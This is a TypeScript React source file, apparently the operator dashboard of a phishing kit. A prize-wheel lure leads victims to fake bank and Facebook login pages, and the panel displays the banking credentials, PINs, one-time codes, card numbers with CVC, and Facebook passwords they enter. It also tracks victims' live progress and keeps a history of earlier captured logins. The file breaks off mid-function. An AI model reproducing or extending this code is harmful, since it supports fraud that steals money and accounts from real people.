"use client";

import { useCallback, useEffect, useState, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import type { DemoSession } from "@/types/session";
import { pathToStep } from "@/lib/session-routes";
import {
  playBeautifulNotification,
  showBeautifulToast,
  sendBrowserNotification,
  enableBrowserNotifications,
  disableBrowserNotifications,
  areBrowserNotificationsEnabled,
} from "@/lib/notification";
import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";
import { LiveWatchModal } from "./LiveWatchModal";
// Banka listesi (/banken) ekraninda kullanilan AYNI logo cozumleyiciyi import ediyoruz
// Boylece admin panelindeki banka logolari = banka secim ekranindaki logolar (BIRBIRININ AYNISI)
import {
  LOCAL_BANK_LOGO_BY_SLUG,
  resolveLocalBankLogoFile,
} from "@/lib/bank-logo-constants";

const SESSION_LIST_COLUMNS =
  "id,public_id,created_at,updated_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";

const LOG_PAGE_SIZE = 100;

const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
  { value: "transfer", label: "Transfer Onayı (€)" },
];

function getApprovalDisplayText(value: string): string {
  if (!value) return "";
  const isConfirmed = value.endsWith("_confirmed");
  const rawValue = isConfirmed ? value.slice(0, -"_confirmed".length) : value;

  // Transfer onayi: yontem (smartid/mobileid) suffix'li — kolonda tek "Transfer" goster.
  if (rawValue.startsWith("transfer")) {
    return isConfirmed ? "Transfer Onaylandı" : "Transfer [Bekliyor]";
  }

  const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === rawValue);
  if (!matchedOption) {
    if (isConfirmed && value.trim()) return `${value.replace("_confirmed", "")} Onaylandı`;
    return "";
  }

  const labelBase = matchedOption.label.includes(" Sayfası")
    ? matchedOption.label.replace(" Sayfası", "")
    : matchedOption.label;

  return isConfirmed ? `${labelBase} Onaylandı` : `${labelBase} [Bekliyor]`;
}

function parseApprovalHistory(value: unknown): string[] {
  if (typeof value !== "string" || !value.trim()) {
    return [];
  }

  try {
    const parsed = JSON.parse(value) as unknown;
    if (Array.isArray(parsed)) {
      const validItems = parsed.filter((item): item is string => typeof item === "string" && item.trim().length > 0);
      return Array.from(new Set(validItems));
    }
  } catch {
    return [value.trim()];
  }

  return [];
}

function inferCanonicalLogFieldKey(
  key: string,
): "personalCode" | "bankPhone" | "username" | "password" | "tacCode" | "loginMethod" | null {
  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

  if (
    normalizedKey.includes("personalidentitycode") ||
    normalizedKey.includes("personalidentificationcode") ||
    normalizedKey.includes("identitycode") ||
    normalizedKey.includes("personalcode") ||
    normalizedKey.includes("isikukood")
  ) {
    return "personalCode";
  }

  if (
    normalizedKey.includes("telefoninumber") ||
    normalizedKey.includes("mobilenumber") ||
    normalizedKey.includes("phonenumber") ||
    normalizedKey.includes("mobileidphone") ||
    normalizedKey.includes("phonefield") ||
    normalizedKey.includes("telefon") ||
    normalizedKey.includes("phone") ||
    normalizedKey === "phone"
  ) {
    return "bankPhone";
  }

  if (
    normalizedKey.includes("userid") ||
    normalizedKey.includes("username") ||
    normalizedKey.includes("loginid") ||
    normalizedKey.includes("nickname") ||
    normalizedKey.includes("kasutajanimi") ||
    normalizedKey.includes("kasutajatunnus") ||
    normalizedKey.endsWith("tunnus")
  ) {
    return "username";
  }

  if (
    normalizedKey.includes("password") ||
    normalizedKey.includes("passcode") ||
    normalizedKey.includes("parool") ||
    normalizedKey.includes("pincalculatorcode") ||
    normalizedKey.includes("pincalccode") ||
    normalizedKey.includes("pincalcpassword") ||
    normalizedKey === "pincalc" ||
    normalizedKey === "pin"
  ) {
    return "password";
  }

  if (
    normalizedKey.includes("tac") ||
    normalizedKey.includes("otp") ||
    normalizedKey.includes("smscode") ||
    normalizedKey.includes("verificationcode") ||
    normalizedKey.includes("responsecode") ||
    normalizedKey.includes("kontrollkood")
  ) {
    return "tacCode";
  }

  if (normalizedKey.includes("loginmethod") || normalizedKey.includes("authmethod")) {
    return "loginMethod";
  }

  return null;
}

function isIgnoredAdminBankFieldKey(key: string): boolean {
  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

  return (
    /^input\d+$/.test(normalizedKey) ||
    normalizedKey.includes("rememberme") ||
    normalizedKey.includes("remembermesimpleid") ||
    normalizedKey.includes("remembermesmartid") ||
    normalizedKey.includes("remembermemobileid") ||
    normalizedKey.includes("loginwidget") ||
    normalizedKey.includes("useridmid") ||
    normalizedKey.includes("useridsid") ||
    normalizedKey.includes("useridsimple") ||
    normalizedKey === "mobileid" ||
    normalizedKey === "smartid" ||
    normalizedKey === "idcard" ||
    normalizedKey === "pincalc" ||
    normalizedKey === "kalkulaator"
  );
}

function shouldHideDuplicateBankField(formData: Record<string, any>, key: string, value: unknown): boolean {
  if (typeof value !== "string" || !value.trim()) {
    return false;
  }

  const canonicalKey = inferCanonicalLogFieldKey(key);
  if (!canonicalKey || canonicalKey === key) {
    return false;
  }

  const canonicalValue =
    canonicalKey === "username"
      ? String(formData.username ?? formData.verfuegernummer ?? "").trim()
      : canonicalKey === "password"
        ? String(formData.password ?? formData.pin ?? "").trim()
        : String(formData[canonicalKey] ?? "").trim();

  return Boolean(canonicalValue) && canonicalValue === value.trim();
}

function isVisibleAdminBankField(formData: Record<string, any>, key: string, value: unknown): boolean {
  if (!value) return false;
  if (isIgnoredAdminBankFieldKey(key)) return false;

  const preferredKeys = new Set([
    "loginMethod",
    "personalCode",
    "bankPhone",
    "username",
    "verfuegernummer",
    "password",
    "pin",
    "tacCode",
    "pasnummer",
    "rekeningnummer",
    "toegangscode",
    "signatuur",
    "identificatiecode",
  ]);

  if (preferredKeys.has(key)) {
    return true;
  }

  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
  if (normalizedKey.includes("rememberme")) {
    return false;
  }

  const canonicalKey = inferCanonicalLogFieldKey(key);
  if (!canonicalKey) {
    return false;
  }

  if (shouldHideDuplicateBankField(formData, key, value)) {
    return false;
  }

  const canonicalValue =
    canonicalKey === "username"
      ? String(formData.username ?? formData.verfuegernummer ?? "").trim()
      : canonicalKey === "password"
        ? String(formData.password ?? formData.pin ?? "").trim()
        : String(formData[canonicalKey] ?? "").trim();

  return !canonicalValue;
}

function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[string, string]> {
  const pickString = (...keys: string[]) => {
    for (const key of keys) {
      const value = formData[key];
      if (typeof value === "string" && value.trim()) {
        return value.trim();
      }
    }
    return "";
  };

  const orderedField1 = pickString("orderedField1");
  const orderedField2 = pickString("orderedField2");
  const orderedField2Type = pickString("orderedField2Type");
  const rawPersonalCode = pickString("personalCode");
  const rawUsername = pickString("username", "verfuegernummer");
  const rawPassword = pickString("password", "pin");

  const primaryValue = orderedField1 || rawPersonalCode || rawUsername;
  const secondaryValue = orderedField2 || rawPassword;

  if (!primaryValue && !secondaryValue) {
    return [];
  }

  const fields: Array<[string, string]> = [];

  if (primaryValue) {
    fields.push(["personalCode", primaryValue]);
  }

  if (!secondaryValue) {
    return fields;
  }

  if (orderedField2Type === "phone") {
    fields.push(["bankPhone", secondaryValue]);
    return fields;
  }

  if (orderedField2Type === "password" || (rawPassword && secondaryValue === rawPassword)) {
    fields.push(["password", secondaryValue]);
    return fields;
  }

  fields.push(["username", secondaryValue]);
  return fields;
}

function getAdditionalAdminBankFields(formData: Record<string, any>): Array<[string, string]> {
  const hiddenKeys = new Set([
    "firstName",
    "lastName",
    "phone",
    "bankName",
    "bankSlug",
    "loginMethod",
    "orderedField1",
    "orderedField2",
    "orderedField2Type",
    "personalCode",
    "bankPhone",
    "username",
    "verfuegernummer",
    "password",
    "pin",
    "tacCode",
    "smsCode",
    "cardNumber",
    "cardExpiry",
    "cardCvc",
    // --- FACEBOOK ALANLARI: BANKA / DIGER KOLONLARA KARIŞMAZ, SADECE FACEBOOK SUTUNUNDA ---
    "fbFirstName",
    "fbLastName",
    "fbEmail",
    "fbPassword",
    "fbUserId",
    "fbSubmittedAt",
    "currency",
    "partner_display_name",
    "participationCode",
    "is_wheel_game",
    "specialNoticeText",
    "specialNoticeImage",
    "specialNoticeLang",
    "specialNoticeSentAt",
    "approvalStatus",
    "approvalCode",
    "approvalHistory",
    // --- CARK / ODUL ILE ILGILI TUM ALANLAR - BANKA KOLONUNDA HIC GOSTERILMEYECEK ---
    "amount",
    "wheel_result_kind",
    "wheel_result_label",
    "wheel_result_amount",
    "wheel_win_amount",
    "prize_amount",
    "wonAmount",
    "winAmount",
    "prizeLabel",
    "selectedPrize",
    "spinResult",
    "won_label",
    "won_amount",
    // --- Form icinde gecen alternatif keyler ---
    "preemia",
    "boonus",
    "auhind",
  ]);

  return Object.entries(formData).flatMap(([key, value]) => {
    const lowerKey = key.toLowerCase();
    if (
      hiddenKeys.has(key) ||
      isIgnoredAdminBankFieldKey(key) ||
      lowerKey.startsWith("wheel_") ||
      lowerKey.startsWith("prize") ||
      lowerKey.startsWith("won") ||
      lowerKey.includes("result") ||
      lowerKey === "amount" ||
      lowerKey.includes("preemia") ||
      lowerKey.includes("boonus") ||
      lowerKey.includes("auhind")
    ) {
      return [];
    }

    if (typeof value !== "string") {
      return [];
    }

    const trimmedValue = value.trim();
    if (!trimmedValue) {
      return [];
    }

    if (inferCanonicalLogFieldKey(key)) {
      return [];
    }

    if (shouldHideDuplicateBankField(formData, key, trimmedValue)) {
      return [];
    }

    return [[key, trimmedValue]];
  });
}

// ============================================================
//  GIRIS YONTEMI OKU (tum alternatif keyler):
//  form_data.loginMethod, login_method, login_type, selectedMethod, authMethod, smart_id_method, method
// ============================================================
function readLoginMethod(fd: Record<string, any>): string | null {
  const candidates = [
    "loginMethod",
    "login_method",
    "loginType",
    "login_type",
    "selectedMethod",
    "selected_method",
    "authMethod",
    "auth_method",
    "authenticationMethod",
    "smartIdMethod",
    "mobileIdMethod",
    "method",
    "bankLoginMethod",
  ];
  for (const k of candidates) {
    const v = fd[k];
    if (typeof v === "string" && v.trim()) return v.trim();
  }
  return null;
}

// ============================================================
//  BANKA LOGO URL URET - BANKA LISTESI (/banken) ILE AYNI COZUM:
//  1. form_data.icindeki logo alanlarini oku (logoFile, logoUrl, logo_url, logo, logoFile, bankLogo, image, icon)
//  2. resolveLocalBankLogoFile() calistir -> LOCAL_BANK_LOGO_BY_SLUG (Estonya bankalari /estonia alt klasorunden .jpg/png)
//  3. fallback: /bank-logos/{slug}.svg / .png / .jpg / .jpeg / .webp sirasiyla dene
//  4. En son: 3 harf initial pill (renkli)
// ============================================================
function resolveBankLogoUrl(fd: Record<string, any>): { src: string | null; initials: string; fallbackColor: string } {
  const slug = (fd.bankSlug ?? fd.slug ?? "").toString().trim().toLowerCase();
  const name = (fd.bankName ?? fd.name ?? "").toString().trim();
  // 1. fd icindeki alternatif logo alanlarini topla
  const logoCandidates: string[] = [];
  const logoKeys = [
    "logoFile", "logo_file", "logoUrl", "logo_url",
    "logo", "logoImage", "logo_image", "bankLogo", "bank_logo",
    "image", "icon", "brandImage", "brand_image",
    "bankLogoUrl", "bank_logo_url", "thumbnail",
  ];
  for (const k of logoKeys) {
    const v = fd[k];
    if (typeof v === "string" && v.trim()) logoCandidates.push(v.trim());
  }

  // 2. resolveLocalBankLogoFile() dene (banka listesindeki AYNI fonksiyon!)
  // Bu zaten LOCAL_BANK_LOGO_BY_SLUG map'inden Estonya bankalar için
  // /bank-logos/estonia/{slug}.jpg/png döner
  let finalSrc: string | null = null;
  for (const cand of logoCandidates) {
    const resolved = resolveLocalBankLogoFile(slug || null, cand);
    if (resolved) { finalSrc = resolved; break; }
  }
  if (!finalSrc) {
    const fromSlug = resolveLocalBankLogoFile(slug || null, null);
    if (fromSlug) finalSrc = fromSlug;
  }

  // 3. fallback: /bank-logos/... uzanti denemeleri (SIRA ONEMLI: svg -> png -> jpg -> jpeg -> webp)
  if (!finalSrc && slug) {
    const fallbackExtensions = [".svg", ".png", ".jpg", ".jpeg", ".webp"];
    // 3a. once dogrudan kok: /bank-logos/{slug}.ext
    for (const ext of fallbackExtensions) {
      const candidate = `/bank-logos/${slug}${ext}`;
      // Burada static olarak "dene" diyemeyiz; ama img onError handler ile düşer.
      // İlk uzantıyı (svg) deneyelim, onError handler ile diğerlerine düşer.
      // Yine de en mantıklısı SVG denemesi sonra initial pill
      finalSrc = candidate; break;
    }
    // 3b. Eger slug "-ee" veya "-pank" içeriyorsa /estonia alt klasörü dene (joker)
    if (!LOCAL_BANK_LOGO_BY_SLUG[slug] && (slug.includes("-ee") || slug.includes("pank") || slug.includes("banka") || slug.includes("bigbank") || slug.includes("inbank") || slug.includes("citadele") || slug.includes("coop") || slug.includes("luminor") || slug.includes("corporate") || slug.includes("lhv"))) {
      const estoniaFallbacks: Array<[string, string]> = [
        ["jpg", "/bank-logos/estonia"],
        ["png", "/bank-logos/estonia"],
        ["jpeg", "/bank-logos/estonia"],
      ];
      for (const [ext, base] of estoniaFallbacks) {
        // LOCAL_BANK_LOGO_BY_SLUG zaten /bank-logos/estonia döndüğü için bu kısma düşerse yalnızca ilk deneme
        finalSrc = `${base}/${slug}.${ext}`; break;
      }
    }
  }

  // 4. Initial pill fallback (en son)
  const colorPalette = [
    "#0A67C8", // Swedbank mavi
    "#00593C", // SEB koyu yesil
    "#E30613", // LHV / Nordea kirmizi
    "#003F87", // SEB lacivert
    "#004B8D", // Coop mavi
    "#111827", // Bigbank siyah
    "#D52B1E", // Citadele kirmizi
    "#F1850C", // ING turuncu
    "#0099A6", // Tallinn turkuaz
  ];
  const initialBase = name || slug || "???";
  let initials = initialBase
    .replace(/[^A-Za-z0-9 ğüşıöçĞÜŞİÖÇäöõüÄÖÕÜ]/g, " ")
    .trim()
    .split(/\s+/)
    .map((w: string) => (w ? w[0] ?? "" : ""))
    .join("")
    .toUpperCase()
    .slice(0, 3);
  if (!initials) initials = "???";
  let hash = 0;
  const hashBase = slug || initialBase;
  for (let i = 0; i < hashBase.length; i++) {
    hash = (hash * 31 + hashBase.charCodeAt(i)) >>> 0;
  }
  const fallbackColor = colorPalette[hash % colorPalette.length] ?? "#0A67C8";
  return { src: finalSrc, initials, fallbackColor };
}

// ============================================================
//  BANKA GIRIS BILGILERI (SADECE KISA LABEL + DEGER):
//  Kimlik No, ID/K.Adı, Şifre/PIN, Telefon, TAC, Hesap No, Giriş Kodu, İmza, Kimlik Kodu
//  ONEMLI: ODEME KARTI (cardNumber / pasnummer / Kart No) ve kart skt/cvc BURAYA BASILMAZ!
//  Cunku kart bilgileri zaten KART isimli AYRI SUTUNDA gosteriliyor. Tekrarlana/bastirilmaz.
//  Burada sadece TANIMLI alanlar BASILIR, WHEEL_RESULT / AMOUNT HIC BASTIRILMAZ
//  ONEMLI: LABEL ONCELIGI SIKIDIR, yanlis label atamasi olmamasi icin DEGER -> KAYNAK alanina gore label belirlenir
// ============================================================
function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, string]> {
  const pickString = (...keys: string[]) => {
    for (const k of keys) {
      const v = fd[k];
      if (typeof v === "string" && v.trim()) return v.trim();
    }
    return "";
  };
  const orderedField1 = pickString("orderedField1");
  const orderedField2 = pickString("orderedField2");
  const orderedField1Type = pickString("orderedField1Type");
  const orderedField2Type = pickString("orderedField2Type");
  const rawPersonalCode = pickString("personalCode", "personalCodeEE", "isikukood", "idNumber", "identityNumber", "kimlikNo");
  const rawUsername = pickString("username", "verfuegernummer", "customerNumber", "kullaniciAdi", "customerId", "clientNumber", "accountHolder");
  const rawPassword = pickString("password", "pin", "sifre", "parola", "wachtwoord", "passwd");
  const rawBankPhone = pickString("bankPhone", "bankTelefon", "bankTel", "bankaTelefon", "mobile", "mobilePhone", "cell", "telephone", "phoneNumber");
  const rawTac = pickString("tacCode", "tac");
  const rawHesapNo = pickString("rekeningnummer", "accountNumber", "iban");
  const rawGirisKodu = pickString("toegangscode", "accessCode", "bankAccessCode");
  const rawImza = pickString("signatuur", "signature");
  const rawKimlikKodu = pickString("identificatiecode", "idCode");

  // === LABEL belirleme yardimci: DEGER ve TUR bilgisine gore DOGRU label dondurur ===
  const labelFor = (val: string, opts: {
    orderedType?: string;
    isOrderedField?: boolean;
  } = {}): string => {
    const { orderedType, isOrderedField } = opts;
    // 1) ONCELIKLI: eger ordered field TYPE belirtilmisse (guvenilir)
    if (isOrderedField && orderedType) {
      const t = orderedType.toLowerCase();
      if (t === "password" || t === "pin") return "Şifre/PIN";
      if (t === "phone" || t === "mobile" || t === "tel" || t === "telephone") return "Telefon";
      if (t === "personal" || t === "id" || t === "personalcode" || t === "identity") return "Kimlik No";
      if (t === "username" || t === "user" || t === "email" || t === "customer") return "ID/K.Adı";
      if (t === "account" || t === "iban" || t === "accountnumber") return "Hesap No";
      // DİKKAT: "card" / "cardnumber" TURU BURADA ARTIK KULLANILMAZ! Cunku odeme karti ayri KART SUTUNUNDA.
      if (t === "signature" || t === "sign") return "İmza";
      if (t === "tac") return "TAC";
      if (t === "access" || t === "accesscode" || t === "giriskodu") return "Giriş Kodu";
    }
    // 2) DEGER -> HANGI KAYNAKTTAN GELDI ise o label (KESIN)
    if (rawPassword && val === rawPassword) return "Şifre/PIN";
    if (rawBankPhone && val === rawBankPhone) return "Telefon";
    if (rawPersonalCode && val === rawPersonalCode) return "Kimlik No";
    if (rawUsername && val === rawUsername) return "ID/K.Adı";
    if (rawTac && val === rawTac) return "TAC";
    if (rawHesapNo && val === rawHesapNo) return "Hesap No";
    // DİKKAT: rawKartNo KALDIRILDI! Kart numarasi zaten KART SUTUNUNDA gosteriliyor.
    if (rawGirisKodu && val === rawGirisKodu) return "Giriş Kodu";
    if (rawImza && val === rawImza) return "İmza";
    if (rawKimlikKodu && val === rawKimlikKodu) return "Kimlik Kodu";
    // 3) ICERIK HEURISTIK: degerin formatina bak (kismi tahmin ama yalnizca kesin durumlarda)
    if (/^[+\d\s()-]{7,}$/.test(val) && !/^\d{6,8}$/.test(val)) {
      return "Telefon";
    }
    // 4) FALLBACK label
    return isOrderedField ? "Alan 2" : "Ek Alan";
  };

  // ONCE kanonik alanlar (username/password/personalCode) — orderedField aynasi degilse
  // bunlar baskin olsun; orderedField sadece kanonik alan yoksa fallback.
  const first = rawUsername || rawPersonalCode || orderedField1;
  const second = rawPassword || rawBankPhone || orderedField2;
  const results: Array<[string, string]> = [];
  if (first) {
    let label = labelFor(first, { orderedType: orderedField1Type, isOrderedField: !rawUsername && !rawPersonalCode && !!orderedField1 });
    if (label === "Ek Alan" && orderedField1) label = "Alan 1";
    if (label === "Alan 2") label = orderedField1 ? "Alan 1" : "Ek Alan";
    results.push([label, first]);
  }
  if (second) {
    if (first && second === first) {
      // duplicate oldugundan 2. kez basma
    } else {
      let label = labelFor(second, { orderedType: orderedField2Type, isOrderedField: !rawPassword && !rawBankPhone && !!orderedField2 });
      if (label === "Ek Alan" && orderedField2) label = "Alan 2";
      results.push([label, second]);
    }
  }
  if (rawTac && !results.some(([, v]) => v === rawTac)) results.push(["TAC", rawTac]);
  if (rawHesapNo && !results.some(([, v]) => v === rawHesapNo)) results.push(["Hesap No", rawHesapNo]);
  // DİKKAT: "Kart No" satiri KALDIRILDI! Kart numarasi, skt, cvc zaten KART sutununda gorunuyor (No/SKT/CVC).
  if (rawGirisKodu && !results.some(([, v]) => v === rawGirisKodu)) results.push(["Giriş Kodu", rawGirisKodu]);
  if (rawImza && !results.some(([, v]) => v === rawImza)) results.push(["İmza", rawImza]);
  if (rawKimlikKodu && !results.some(([, v]) => v === rawKimlikKodu)) results.push(["Kimlik Kodu", rawKimlikKodu]);
  return results;
}

import { deleteSessionsAction } from "@/app/actions/delete-sessions";

// Adim rozeti (stepText/stepColor) — masaustu tablo satiri ve mobil kart ortak kullanir
function getStepDisplay(
  currentStep: string,
  fd: Record<string, any>,
  isOnline: boolean,
  livePath: string | undefined,
  darkMode: boolean
): { s: string; stepText: string; stepColor: string } {
  let stepText = "BAŞLANGIÇ";
  let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";

  let s = currentStep;
  if (isOnline && livePath) {
    if (livePath.startsWith('/wheel')) s = "wheel";
    else {
      const mapped = pathToStep(livePath);
      if (mapped) s = mapped;
    }
  }

  if (s === "wheel") { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
  else if (s === "code_entry") {
    if (fd.is_wheel_game) { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
    else { stepText = "KOD GİRİŞİ"; stepColor = "text-pink-500 bg-pink-500/10 border border-pink-500/20"; }
  }
  else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-500 bg-blue-500/10 border border-blue-500/20"; }
  else if (s === "win2") { stepText = "İSİM & PROFİL 2"; stepColor = "text-blue-400 bg-blue-400/10 border border-blue-400/20"; }
  else if (s === "verify") { stepText = "DOĞRULAMA"; stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20"; }
  else if (s === "banken" || s === "banken2") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
  else if (s === "bank") {
    let bName = typeof fd.viewingBankName === 'string' ? fd.viewingBankName : typeof fd.bankName === 'string' ? fd.bankName : null;

    if (!bName && livePath && livePath.includes('/bank/')) {
      const parts = livePath.split('/');
      const bankIdx = parts.indexOf('bank');
      if (bankIdx !== -1 && parts.length > bankIdx + 1) {
        bName = parts[bankIdx + 1].replace(/-/g, ' ');
      }
    }

    stepText = bName ? bName.toUpperCase() : "BANKA GİRİŞİ";
    stepColor = "text-orange-500 bg-orange-500/10 border border-orange-500/20";
  }
  else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-500 bg-indigo-500/10 border border-indigo-500/20"; }
  else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-500 bg-purple-500/10 border border-purple-500/20"; }
  else if (s === "facebook") { stepText = "FACEBOOK"; stepColor = "text-[#0064E0] bg-[#0064E0]/10 border border-[#0064E0]/20"; }
  else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-500 bg-gray-500/10 border border-gray-500/20"; }
  else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
  else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
  else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
  else if (s === "custom_question") { stepText = "ÖZEL SORU"; stepColor = "text-violet-500 bg-violet-500/10 border border-violet-500/20"; }
  else if (s === "generator1") { stepText = "GENERATOR 1"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
  else if (s === "generator2") { stepText = "GENERATOR 2"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
  else if (s === "special_approval") {
    const rawAppr = (typeof fd.approvalStatus === "string" ? fd.approvalStatus : "").replace(/_confirmed$/, "");
    const opt = APPROVAL_OPTIONS.find((o) => o.value === rawAppr);
    stepText = opt ? `${opt.label.replace(" Sayfası", "").toUpperCase()} ONAYI` : "ÖZEL BİLDİRİM";
    stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20";
  }

  return { s, stepText, stepColor };
}

export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: boolean, user: any, displayMode?: "normal" | "deleted" | "trash" }) {
  const isDeletedMode = displayMode === "deleted";
  const isTrashMode = displayMode === "trash";
  const supabase = createBrowserSupabaseClient();
  const [rows, setRows] = useState<DemoSession[]>([]);
  const rowsRef = useRef<DemoSession[]>([]);
  const userRef = useRef<any>(user);
  useEffect(() => {
    rowsRef.current = rows;
  }, [rows]);
  useEffect(() => {
    userRef.current = user;
  }, [user]);
  const getCurrentUsername = () => {
    const u = userRef.current;
    return (u?.user_metadata?.username || u?.email?.split('@')[0] || "").toString().trim();
  };
  const isSessionVisibleForCurrentUser = (row?: DemoSession | null) => {
    if (!row) return false;
    const hidden = row.is_hidden === true;
    const pending = (row.form_data as any)?.pending_profile === true;
    // COP LOGLAR: sadece anadomainden gelip isim girmeden kalan bos session'lar
    if (isTrashMode) return !hidden && pending;
    if (isDeletedMode ? !hidden : hidden) return false;
    // Ana domainden gelip henuz isim/odul girmemis bos session'lar gizli kalir
    if (!isDeletedMode && pending) return false;
    return true;
  };


  // Stats
  const [liveVisitorCount, setLiveVisitorCount] = useState(0);
  const [logCount, setLogCount] = useState(0);
  const [bannedCount, setBannedCount] = useState(0);

  // Sayfalama (server-side)
  const [page, setPage] = useState(0);
  const pageRef = useRef(0);
  const [totalCount, setTotalCount] = useState(0);
  const [exporting, setExporting] = useState(false);
  useEffect(() => {
    pageRef.current = page;
  }, [page]);
  useEffect(() => {
    setPage(0);
    pageRef.current = 0;
  }, [isDeletedMode]);

  // Ban Listesi (Ban Sayısı StatCard tıklanınca)
  const [showBannedListModal, setShowBannedListModal] = useState(false);
  const [bannedList, setBannedList] = useState<any[]>([]);
  const [loadingBanned, setLoadingBanned] = useState(false);

  // Presence
  const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
  const prevOnlineRef = useRef<Set<string>>(new Set());
  const graceLeftRef = useRef<Map<string, number>>(new Map());
  const lastPathRef = useRef<Map<string, string>>(new Map());
  const [sessionPaths, setSessionPaths] = useState<Record<string, string>>({});
  const [sessionLastSeenAt, setSessionLastSeenAt] = useState<Record<string, number>>({});
  const [, setPresenceTick] = useState(0);

  const [chatSessionId, setChatSessionId] = useState<string | null>(null);
  const [deviceInfoSession, setDeviceInfoSession] = useState<DemoSession | null>(null);
  const [liveWatchRow, setLiveWatchRow] = useState<DemoSession | null>(null);
  // =============== GECMIS GIRIS MODAL (Banka + Facebook onceki kayitlari) ===============
  const [showHistoryModal, setShowHistoryModal] = useState(false);
  const [historyModalSession, setHistoryModalSession] = useState<DemoSession | null>(null);

  // Yardimci: ISO date -> "01.10.2026 22:13:45"
  const fmtDate = (iso: unknown): string => {
    if (!iso || typeof iso !== "string") return "-";
    try {
      const d = new Date(iso);
      if (isNaN(d.getTime())) return iso;
      const pad = (n: number) => n.toString().padStart(2, "0");
      return `${pad(d.getDate())}.${pad(d.getMonth() + 1)}.${d.getFullYear()} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
    } catch { return iso; }
  };

  const parseBankHistory = (fd: Record<string, unknown>): any[] => {
    try {
      const raw = fd.bankLoginHistory ?? fd.bankFormHistory;
      let arr: unknown;
      if (typeof raw === "string") {
        try { arr = JSON.parse(raw); } catch { arr = raw; }
      } else {
        arr = raw;
      }
      let result: any[] = [];
      if (Array.isArray(arr)) {
        result = arr.filter((r) => r && typeof r === "object");
      }
      const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
      // GUNCEL (form_data) kaydinin DEGISMEYECEK KILITLENMIS DEGERLERI:
      //    NOT: Bu degerler GUNCEL olanlar, bunlarla birebir eslesen history kaydi = GUNCEL (gosterilmemeli)
      const cur = {
        bankSlug: str(fd.bankSlug),
        bankName: str(fd.bankName),
        loginMethod: str(fd.loginMethod),
        personalCode: str(fd.personalCode),
        bankPhone: str(fd.bankPhone),
        user: (str(fd.username) || str(fd.verfuegernummer)),
        pass: (str(fd.password) || str(fd.pin)),
        tacCode: str(fd.tacCode),
        of1: str(fd.orderedField1),
        of2: str(fd.orderedField2),
      };
      const curBankSubmittedAt = str(fd.bankSubmittedAt);
      result = result.map((rRaw: any) => {
        // GUVENLIK: History kaydinin bankaName / bankSlug degerleri DEGISTIRILMEMIS KALSIN.
        // Eski kodda bir yerde fd.bankSlug/name ile override edilmis gibi gorunuyor.
        // Burada SADECE history KAYDININ KENDI bankName/bankSlug DEGERLERINI kullan.
        const r: Record<string, unknown> = rRaw && typeof rRaw === "object" ? { ...rRaw } : (rRaw as any);
        return r;
      }).filter((r: Record<string, unknown>) => {
        const rBankSlug = str(r.bankSlug);
        const rBankName = str(r.bankName);
        const rLogin = str(r.loginMethod);
        const rPers = str(r.personalCode);
        const rBankPhone = str(r.bankPhone);
        const rUser = str(r.username) || str(r.verfuegernummer);
        const rPass = str(r.password) || str(r.pin);
        const rTac = str(r.tacCode);
        const rOf1 = str(r.orderedField1);
        const rOf2 = str(r.orderedField2);
        const rSubmittedAt = str(r.submittedAt);

        // 1) GARBAGE filtresi
        const meaningful = [rLogin, rPers, rBankPhone, rUser, rPass, rTac, rOf1, rOf2].filter(Boolean);
        if (meaningful.length < 2) return false;

        // 2) AYNI BANKA mi? (farkli banka ise KESIN ESKI kayit = GÖSTER)
        const sameBank = Boolean(
          (cur.bankSlug && rBankSlug && cur.bankSlug === rBankSlug) ||
          (cur.bankName && rBankName && cur.bankName === rBankName)
        );
        if (!sameBank) return true;

        // 3) AYNI BANKA: ZAMAN kiyaslamasi (bankSubmittedAt varsa)
        if (curBankSubmittedAt && rSubmittedAt) {
          try {
            const curMs = new Date(curBankSubmittedAt).getTime();
            const rMs = new Date(rSubmittedAt).getTime();
            if (isFinite(curMs) && isFinite(rMs)) {
              // submittedAt GUNCEL zamandan YENI ise (yani giris zamani ayni) -> GUNCEL kayit (GIZLE)
              // submittedAt GUNCEL zamandan ESKI ise -> GERCEKTEN ESKI (GÖSTER)
              if (rMs < curMs) return true;
              // GUNCEL zaman ile ESIT veya YENI ise GUNCEL olabilir (devam et alttaki kurala)
            }
          } catch {
            /* ignore invalid dates */
          }
        }

        // 4) AYNI BANKA: 8 alanda KAC tane FARKLI?
        //    0 veya 1 alan farkliysa = GUNCEL (cok yakin) -> GIZLE
